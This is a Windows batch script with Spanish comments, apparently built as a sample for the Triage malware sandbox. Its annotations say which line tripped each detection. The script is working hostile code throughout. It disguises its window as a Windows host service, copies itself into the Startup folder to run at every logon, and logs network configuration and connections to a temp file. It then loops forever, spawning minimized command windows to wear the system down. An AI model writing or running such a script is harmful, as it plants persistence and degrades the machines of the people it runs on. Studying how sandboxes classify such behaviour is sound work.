@echo off
:: 1. DEFENSA Y EVASIÓN
:: Triage detecta este título como un intento de ocultación (defense_evasion).
title Windows Host Process Service
color 0a

:: 2. EL COMANDO QUE DIO EL 7/10: PERSISTENCIA
:: Esta línea es la que activó el "Drops startup file".
:: El sandbox detectó que el script creó una copia de sí mismo para ejecutarse al arrancar.
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\win_host_srv.bat" /y >nul 2>&1

:: 3. DISCOVERY (Reconocimiento)
:: Estos comandos de red son los que activaron la etiqueta "discovery".
ipconfig /all > %temp%\net_diag.log
netstat -an >> %temp%\net_diag.log

:: 4. BUCLE DE PROCESOS
:main_service
:: Abre ventanas minimizadas para saturar el sistema gradualmente.
start /min cmd.exe /c "echo Cargando componentes... && pause"
timeout /t 5 >nul
goto main_service
